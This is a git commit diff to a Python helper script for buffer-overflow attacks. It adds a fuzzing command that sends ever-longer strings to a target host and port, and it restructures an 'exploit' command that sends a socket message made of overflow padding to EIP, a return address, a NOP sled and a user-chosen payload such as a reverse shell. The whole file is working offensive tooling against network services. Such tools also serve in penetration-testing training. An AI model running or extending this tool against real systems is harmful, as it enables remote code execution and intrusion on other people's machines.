d860e6b642c5e60f0925eb759ee2363410e7b781
Philser <pk30.05@hotmail.de>
2021-02-14 05:33:27 -0500

    Add fuzzing functionality

--- tools/buffer_overflow/overflow_helper.py
+++ tools/buffer_overflow/overflow_helper.py
@@ -1,11 +1,18 @@
 import socket
+import time
+import sys
 import click
 
 # TODO: Fuzzing mode?
 # TODO: Interactive mode?
 #   - Send messages as a live session
 #   - Prepare malicious message beforehand, for example
-# TODO: Option to print out malicious message
+# TODO: Option to print out prepared malicious message
+
+
+@click.group()
+def cli():
+    pass
 
 
 @click.command()
@@ -13,7 +20,7 @@ import click
 @click.argument('port', type=int)
 @click.option('--payload', default='',  # TODO: Find a nice flag
               help='The payload to send, e.g. a reverse shell')
-@click.option('--offset', '-o', default=0,
+@click.option('--offset', '-o', required=True, type=int,
               help='Offset to EIP, determining the input size by: '
               + 'overflow-char * OFFSET ')
 @click.option('--overflow-char', default='\x90')
@@ -22,8 +29,8 @@ import click
               + 'overflow input')
 @click.option('--padding', default=0, help='Amount of NOPs to be inserted '
               + 'return address and payload')
-def main(address, port, payload, offset, overflow_char, return_address,
-         padding):
+def exploit(address, port, payload, offset, overflow_char, return_address,
+            padding):
     overflow = overflow_char * offset
 
     message = overflow + return_address + '\x90' * padding + payload
@@ -39,5 +46,36 @@ def main(address, port, payload, offset, overflow_char, return_address,
         print(e)
 
 
+@click.command()
+@click.argument('address')
+@click.argument('port', type=int)
+@click.option('--payload', '-p', default='')
+@click.option('--max-iterations', '-m', default=30)
+@click.option('--increment', '-i', default=100)
+def fuzz(address, port, payload, max_iterations, increment):
+    buffer = []
+    counter = 100
+    while len(buffer) < max_iterations:
+        buffer.append("A" * counter)
+        counter += increment
+
+    for string in buffer:
+        try:
+            s = socket.create_connection((address, port))
+            print("Fuzzing with %s bytes" % len(string))
+            string = payload + ' ' + string + "\r\n"
+            s.send(string.encode())
+            s.recv(1024)
+            s.close()
+        except OSError as e:
+            print("Could not connect to " + address + ":" + str(port))
+            print(e)
+            sys.exit(0)
+        time.sleep(1)
+
+
+cli.add_command(exploit)
+cli.add_command(fuzz)
+
 if __name__ == '__main__':
-    main()
+    cli()
